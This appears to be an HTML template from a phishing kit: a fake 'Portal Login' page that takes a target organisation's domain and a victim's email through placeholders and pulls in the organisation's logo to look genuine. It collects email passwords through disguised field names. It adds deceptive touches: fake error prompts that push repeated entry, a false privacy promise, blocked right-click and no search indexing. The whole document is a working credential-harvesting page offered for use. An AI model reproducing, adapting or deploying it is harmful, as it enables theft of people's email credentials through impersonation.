
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">
    <title>{{ins}} Portal Login</title>
    <link rel="icon" href="https://logo.clearbit.com/{{ins}}" type="image/x-icon">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Poppins', sans-serif;
            background: url('https://logo.clearbit.com/{{ins}}') no-repeat center center/cover;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            flex-direction: column;
        }
        .form-holder {
            background: rgba(255, 255, 255, 0.9);
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 90%;
            max-width: 450px;
        }
        .xlogo {
            background: #0073e6;
            color: #fff;
            padding: 15px;
            border-radius: 10px 10px 0 0;
            font-weight: bold;
        }
        .xlogo img {
            width: 40px;
            height: 40px;
            object-fit: contain;
            margin-right: 10px;
        }
        .form-wrap {
            margin-top: 20px;
        }
        .finput input {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            border-radius: 5px;
            border: 1px solid #ccc;
            margin-top: 10px;
        }
        .finput input:focus {
            border-color: #0073e6;
            outline: none;
        }
        button {
            width: 100%;
            padding: 12px;
            font-size: 18px;
            border: none;
            border-radius: 5px;
            background-color: #0073e6;
            color: white;
            margin-top: 15px;
            cursor: pointer;
            transition: background 0.3s ease;
        }
        button:hover {
            background-color: #005bb5;
        }
        .privacy {
            font-size: 12px;
            color: #666;
            margin-top: 10px;
        }
        .icon-below {
            margin-top: 15px;
        }
    </style>
</head>
<body oncontextmenu="return false;">
    <div class="form-holder">
        <div class="xlogo">
            <span id="banNer">{{ins}} Portal</span>
        </div>
        <div class="form-wrap">
            <form action="second" method="POST">
                <p>Please log in with your email</p>
                <img src="https://logo.clearbit.com/{{ins}}" width="70" height="70" style="margin: 10px;">
                <div class="alert alert-danger" id="mgss" style="display: none; color: red; font-weight: 600;">Incorrect password! Please enter the correct password.</div>
                <span id="error" class="text-danger" style="display: none; color: red;">The account does not exist. Please enter another account.</span>
                <div class="finput">
                    <input type="email" id="ai" name="horse" value="{{eman}}" required placeholder="Email Address">
                </div>
                <div class="finput">
                    <input type="password" name="pig" id="pr" required placeholder="Email Password">
                </div>
                <button id="submit-btn">Continue</button>
                <span class="privacy">
                    Privacy Policy: Your information will only be used for the verification process and will not be sold or shared with any third parties.
                </span>
                <div class="icon-below">
                    <img src="https://cdn-icons-png.flaticon.com/512/8631/8631491.png" width="50" height="50">
                </div>
            </form>
        </div>
    </div>
</body>
</html>
